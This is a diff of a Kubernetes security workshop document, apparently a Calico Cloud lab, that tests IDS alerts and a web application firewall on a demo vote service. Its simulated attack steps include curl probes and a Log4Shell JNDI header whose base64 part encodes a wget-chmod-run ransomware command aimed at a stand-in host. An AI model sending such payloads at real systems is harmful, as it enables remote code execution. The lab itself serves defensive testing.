@@ -41,17 +41,17 @@ For this workshop, we will enable the IDS for the vote service and observe the a
 
 3. Test the IDS emulating an attack to the vote service:
 
-   - Find the IP address of the vote application and export it to the `VOTE_EXTERNAL` environment variable
+   - Open a new Cloud Shell session and start a pod to simulate an attack on the vote service.
 
      ```bash
-     export VOTE_EXTERNAL=$(kubectl get svc -n vote vote -o=jsonpath='{.status.loadBalancer.ingress[*].ip}')
+     kubectl exec attacker -it -- /bin/bash
      ```
 
-   - From your shell, execute the following commands.
+   - From pod attacker's shell, execute the following commands.
 
      ```bash
-     curl -m2 http://$VOTE_EXTERNAL/cmd.exe
-     curl -m2 http://$VOTE_EXTERNAL/NessusTest
+     curl -m2 http://vote.vote/cmd.exe
+     curl -m2 http://vote.vote/NessusTest
      ```
 
    - Observe the results in the Service Graph to see the generated alerts that will warn you about the exploitation attempt.
@@ -62,32 +62,25 @@ A web application firewall (WAF) safeguards web applications against a range of 
 
 Calico Cloud WAF allows you to selectively run service traffic within your cluster and protect intra-cluster traffic from common HTTP-layer attacks. To increase protection, you can use Calico Cloud network policies to enforce security controls on selected pods on the host.
 
-1. Deploy the WAF by running the following command:
-
-   ```bash
-   kubectl apply -f waf
-   ```
-
-2. Open a new Cloud Shell session and start a pod to simulate an attack on the vote service.
-
-   ```bash
-   kubectl run attacker --image nicolaka/netshoot -it --rm -- /bin/bash
-   ```
-3. Before protecting the service with the WAF, try the following command from the attacker shell. This request will simulate a LOG4J attack.
+1. Before protecting the service with the WAF, try the following command from the attacker shell. This request will simulate a LOG4J attack.
 
    ```bash
    curl -v -H \
      'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
      'vote.vote'
    ```
+   
+   Observe that the result was an HTTP 200 - Ok . The malicious request was not blocked.
 
-4. Now enable the WAF using the following command from your shell (not from the pod attacker).
+2. Enable the WAF in the Calico Cloud UI.
 
-   ```
-   kubectl patch applicationlayer tigera-secure --type='merge' -p '{"spec":{"webApplicationFirewall":"Enabled"}}'
-   ```
+<image 1>
 
-5. Go back to the attack pod, and repeat the request.
+3. Verify that the service selected include the frontends `vote` amd `result` of our example application and click `Confirm Selection`.
+
+<image 2>
+
+4. Go back to the attack pod, and repeat the request.
 
    ```bash
    curl -v -H \
